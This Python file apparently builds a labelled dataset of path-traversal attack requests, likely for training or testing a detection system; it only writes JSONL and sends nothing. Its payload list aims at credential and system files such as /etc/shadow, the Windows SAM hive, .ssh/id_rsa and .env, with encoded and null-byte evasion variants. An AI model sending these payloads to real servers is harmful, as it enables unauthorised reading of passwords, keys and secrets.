"""Path Traversal Attack Traffic Generator."""

import json
import uuid
import time
from datetime import datetime
from pathlib import Path


TRAVERSAL_PAYLOADS = {
    "unix": [
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "....\/....\/....\/etc/passwd",
    ],
    "windows": [
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\boot.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "url_encoded": [
        "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ],
    "double_encoded": [
        "..%252f..%252f..%252fetc/passwd",
        "%252e%252e%252f%252e%252e%252fetc/passwd",
    ],
    "null_byte": [
        "../../../etc/passwd%00.html",
        "..\\..\\..\\windows\\win.ini%00.txt",
    ],
    "sensitive_files": [
        "../../../.env",
        "../../../.git/config",
        "../../../.htpasswd",
        "../../../config/database.yml",
        "../../../wp-config.php",
        "../../../package.json",
        "../../../.ssh/id_rsa",
    ],
}

TARGET_ENDPOINTS = ["/download", "/products", "/search"]


def generate_traversal_requests(num_requests: int = 100) -> list[dict]:
    """Generate path traversal attack requests."""
    requests = []
    timestamp = time.time()
    techniques = list(TRAVERSAL_PAYLOADS.keys())

    for i in range(num_requests):
        technique = techniques[i % len(techniques)]
        payload = TRAVERSAL_PAYLOADS[technique][i % len(TRAVERSAL_PAYLOADS[technique])]
        endpoint = TARGET_ENDPOINTS[i % len(TARGET_ENDPOINTS)]

        requests.append({
            "request_id": f"REQ-TRAV-{uuid.uuid4().hex[:8].upper()}",
            "timestamp": datetime.fromtimestamp(timestamp).isoformat(),
            "method": "GET",
            "path": endpoint,
            "query_string": f"file={payload}",
            "query": {"file": payload},
            "headers": {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            },
            "body_fields": [],
            "body_size": 0,
            "session_id": f"S-ATTACK-{uuid.uuid4().hex[:6].upper()}",
            "source_id": f"ATTACKER-{uuid.uuid4().hex[:4].upper()}",
            "content_type": "",
            "label": "ATTACK",
            "attack_type": "PATH_TRAVERSAL",
            "technique": technique,
            "payload": payload,
        })

        timestamp += 0.1

    return requests


def save_dataset(requests: list[dict], filepath: str):
    """Save attack requests to JSONL."""
    Path(filepath).parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w") as f:
        for req in requests:
            f.write(json.dumps(req) + "\n")
    print(f"Saved {len(requests)} traversal requests to {filepath}")


if __name__ == "__main__":
    requests = generate_traversal_requests(100)
    save_dataset(requests, "data/raw/attacks/traversal.jsonl")
